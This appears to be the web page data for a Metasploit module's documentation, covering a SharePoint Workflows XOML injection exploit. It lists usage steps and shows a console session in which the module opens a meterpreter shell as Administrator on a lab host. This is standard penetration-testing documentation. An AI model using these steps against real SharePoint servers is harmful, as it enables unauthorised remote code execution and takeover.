{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/sharepoint_workflows_xoml","result":{"data":{"moduleMetadataJson":{"id":"6ddf2af0-5803-5fc8-8929-34d0433efb96","name":"SharePoint Workflows XOML Injection","fullname":"exploit/windows/http/sharepoint_workflows_xoml","description":"This module exploits a vulnerability within SharePoint and its .NET backend\n        that allows an attacker to execute commands using specially crafted XOML data\n        sent to SharePoint via the Workflows functionality.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/sharepoint_workflows_xoml","documentationSlug":"/modules/documentation/exploit/windows/http/sharepoint_workflows_xoml"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a vulnerability within SharePoint and its .NET backend\nthat allows an attacker to execute commands using specially crafted XOML data\nsent to SharePoint via the Workflows functionality.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/sharepoint_workflows_xoml</code></li>\n<li>Set the target options (<code class=\"language-text\">RHOSTS</code>, <code class=\"language-text\">RPORT</code> and <code class=\"language-text\">SSL</code>) as appropriate</li>\n<li>Set the authentication options (<code class=\"language-text\">DOMAIN</code>, <code class=\"language-text\">USERNAME</code> and <code class=\"language-text\">PASSWORD</code>) as appropriate</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"sharepoint-2019-on-server-2016\" style=\"position:relative;\"><a href=\"#sharepoint-2019-on-server-2016\" aria-label=\"sharepoint 2019 on server 2016 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SharePoint 2019 on Server 2016</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/http/sharepoint_workflows_xoml) &gt; show options \n\nModule options (exploit/windows/http/sharepoint_workflows_xoml):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   DOMAIN     WORKGROUP        yes       The domain to use for Windows authentication\n   PASSWORD   Password1        yes       The password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.159.14   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT      80               yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The base path to the SharePoint application\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   USERNAME   administrator    yes       Username to authenticate as\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (windows/x64/meterpreter/bind_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LPORT     4444             yes       The listen port\n   RHOST     192.168.159.14   no        The target address\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   2   Windows Powershell\n\n\nmsf5 exploit(windows/http/sharepoint_workflows_xoml) &gt; exploit\n\n[*] Executing automatic check (disable AutoCheck to override)\n[+] The target is vulnerable.\n[*] Started bind TCP handler against 192.168.159.14:4444\n[*] Sending stage (206403 bytes) to 192.168.159.14\n[*] Meterpreter session 3 opened (0.0.0.0:0 -&gt; 192.168.159.14:4444) at 2020-03-23 18:11:44 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : SHRPNT2019-P\nOS              : Windows 2016+ (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : SHRPNT2019P\nLogged On Users : 14\nMeterpreter     : x64/windows\nmeterpreter &gt; getuid\nServer username: SHRPNT2019P\\Administrator\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"6ddf2af0-5803-5fc8-8929-34d0433efb96"}}}